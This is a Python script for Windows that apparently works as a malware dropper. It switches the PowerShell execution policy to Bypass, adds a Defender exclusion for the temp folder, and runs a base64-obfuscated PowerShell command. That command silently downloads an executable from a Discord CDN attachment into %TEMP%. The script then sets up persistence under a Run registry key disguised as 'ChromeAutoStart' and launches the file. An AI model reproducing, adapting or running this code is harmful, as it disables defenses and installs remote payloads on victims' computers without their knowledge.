import os
import platform
import time
import winreg
import subprocess, sys

file_name = 'file.exe'

if platform.system() == 'Windows':
    pass
else:
    exit()

def check_cmd_output(command, string_to_find):
    output = subprocess.check_output(command, shell=True, text=True)
    if string_to_find in output:
        return True
    else:
        return False

def reg_set():
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell", 0, winreg.KEY_WRITE)
    winreg.SetValueEx(key, "ExecutionPolicy", 0, winreg.REG_SZ, "Bypass")
    winreg.CloseKey(key)

key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell", 0, winreg.KEY_READ)
value, _ = winreg.QueryValueEx(key, "ExecutionPolicy")
winreg.CloseKey(key)
if value == "Bypass":
     pass
else:
     reg_set()

def add_to_startup():
    key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE)
    value_name = "ChromeAutoStart"
    value_data = r"conhost.exe %temp%\{}".format(file_name)
    winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, value_data)
    winreg.CloseKey(key)

ProcessBypass_command = subprocess.Popen([f"powershell.exe", r"Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force"], stdout=sys.stdout)
ProcessBypass_command.communicate()
exclusion_command = subprocess.Popen([f"powershell.exe", r"Set-MpPreference -ExclusionPath $env:TEMP"], stdout=sys.stdout)
exclusion_command.communicate()

try:
    drop = subprocess.Popen([f"powershell.exe", r"Invoke-Expression ([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('cnVuZGxsMzIuZXhlIHNoZWxsMzIuZGxsLFNoZWxsRXhlY19SdW5ETEwgcG93ZXJzaGVsbC5leGUgIC1XaW5kb3dTdHlsZSBoaWRkZW4gSW52b2tlLVdlYlJlcXVlc3QgLVVyaSAiaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvMTA3NjQ3Mzk0NDUyNzM0MzcyNi8xMDc2NDc0MDI3NzIxMzYzNDc2L2EuZXhlIiAtT3V0RmlsZSAiJGVudjp0ZW1wXGZpbGUuZXhlIg==')))"], stdout=sys.stdout)
    drop.communicate()
except Exception as e:
    pass

if check_cmd_output('dir %temp%', file_name) == False:
    time.sleep(5)
    pass
else:
    add_to_startup()
    os.system(r"conhost.exe %temp%\{}".format(file_name))
    exit()

if check_cmd_output('dir %temp%', file_name) == False:
    try:
        drop = subprocess.Popen([f"powershell.exe", r"Invoke-Expression ([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('cnVuZGxsMzIuZXhlIHNoZWxsMzIuZGxsLFNoZWxsRXhlY19SdW5ETEwgcG93ZXJzaGVsbC5leGUgIC1XaW5kb3dTdHlsZSBoaWRkZW4gSW52b2tlLVdlYlJlcXVlc3QgLVVyaSAiaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvMTA3NjQ3Mzk0NDUyNzM0MzcyNi8xMDc2NDc0MDI3NzIxMzYzNDc2L2EuZXhlIiAtT3V0RmlsZSAiJGVudjp0ZW1wXGZpbGUuZXhlIg==')))"], stdout=sys.stdout)
        drop.communicate()
        time.sleep(15)
    except Exception as e:
        exit()

if check_cmd_output('dir %temp%', file_name):
    add_to_startup()
    os.system(r"conhost.exe %temp%\{}".format(file_name))
else:
    exit()
